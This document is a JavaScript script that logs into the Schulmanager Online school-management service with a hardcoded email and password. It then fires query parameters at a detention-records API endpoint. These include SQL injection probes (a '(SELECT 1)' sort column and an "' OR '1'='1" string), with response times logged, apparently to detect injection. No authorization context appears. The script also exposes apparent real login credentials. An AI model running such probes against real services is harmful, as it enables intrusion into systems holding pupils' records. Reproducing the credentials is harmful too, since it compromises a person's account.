const B = 'https://login.schulmanager-online.de';
(async () => {
  const lr = await fetch(B + '/api/login', {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ emailOrUsername: 'frislop21@gmail.com', password: 'Neodeo34!!', hash: null, mobileApp: false, userId: null, twoFactorCode: null, institutionId: null })
  });
  const jwt = (await lr.json()).jwt;
  const H = { 'content-type': 'application/json', authorization: 'Bearer ' + jwt };
  const run = async (params) => {
    const t0 = Date.now();
    const r = await fetch(B + '/api/calls', {
      method: 'POST', headers: H,
      body: JSON.stringify({ bundleVersion: '0d024d5311', requests: [{ moduleName: null, endpointName: 'poqa', parameters: { action: { model: 'modules/detention/detention-event', action: 'findAll', parameters: [params] }, uiState: 'main.dashboard' } }] })
    });
    const j = await r.json();
    const x = j.results[0];
    return x.status + ' ' + (Date.now() - t0) + 'ms n=' + (Array.isArray(x.data) ? x.data.length : '-') + (x.userError ? ' ue=' + x.userError.errorType : '');
  };
  const cases = {
    orderValid: [{ order: [['id', 'DESC']], limit: 2 }],
    orderBadCol: [{ order: [['nosuchcol', 'DESC']], limit: 2 }],
    orderInject: [{ order: [['(SELECT 1)', 'DESC']], limit: 2 }],
    likeProper: [{ where: { comment: { $like: '%a%' } }, limit: 2 }],
    inOp: [{ where: { id: { $in: [1, 2] } }, limit: 2 }],
    neOp: [{ where: { id: { $ne: 1 } }, limit: 2 }],
    orOp: [{ where: { $or: [{ id: 1 }, { id: 2 }] }, limit: 2 }],
    stringQuote: [{ where: { comment: "' OR '1'='1" }, limit: 2 }],
  };
  for (const [n, p] of Object.entries(cases)) console.log(n.padEnd(12), await run(p));
})();
